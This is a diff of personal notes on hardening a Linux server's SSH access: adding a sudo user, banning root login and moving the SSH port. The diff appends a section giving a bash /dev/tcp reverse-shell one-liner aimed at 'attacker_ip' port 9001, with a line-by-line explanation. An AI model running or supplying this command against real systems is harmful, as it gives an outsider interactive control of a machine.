@@ -16,7 +16,7 @@ Difficulty in Tracking Actions:
 
 If your server is accessed by multiple users and they all use the root account, it becomes difficult to determine who executed which command. This makes tracking down a user who performed a malicious action more challenging.
 
-### Create user & add to sudo group & test
+## Create user & add to sudo group & test
 ```bash
 # create user
 adduser <new user>
@@ -27,7 +27,7 @@ sudo ls /root
 # test ssh
 ssh <new user>@ip_address_of_server
 ```
-### ban root login to server
+## ban root login to server
 ```bash
 # modify ssh config on server
 sudo nano /etc/ssh/sshd_config
@@ -44,7 +44,7 @@ after these following shouldnt be execute
 ssh root@ip_address_of_server
 ```
 
-### Change default port of ssh
+## Change default port of ssh
 
 - allow transfer on <port> : random number greater than 1024 (less are preserved)
 ```bash
@@ -62,3 +62,18 @@ connect via new port
 ```bash
 ssh -p <new port> <new user>@remote_host_or_ip
 ```
+
+## create reverse shell
+```bash
+bash -i >& /dev/tcp/<dest_ip>/<port_ip> 0>&1
+```
+- bash -i: This launches a new interactive Bash shell. The -i flag makes the shell interactive, meaning it will read commands from standard input and provide output to standard output.
+
+- >& /dev/tcp/attacker_ip/9001: This part redirects both the standard output (stdout) and standard error (stderr) of the Bash shell to a TCP connection. Specifically:
+
+- &> is a redirection operator that combines both stdout and stderr.
+/dev/tcp/attacker_ip/9001 is a special file in some Unix-like systems that represents a TCP connection. This means that the Bash shell's output will be sent over a network connection to the IP address attacker_ip on port 9001.
+
+- 0>&1: This part redirects standard input (stdin) from the same source as standard output (stdout). In other words, it makes the shell read its input from the same TCP connection that it's writing its output to.
+
+
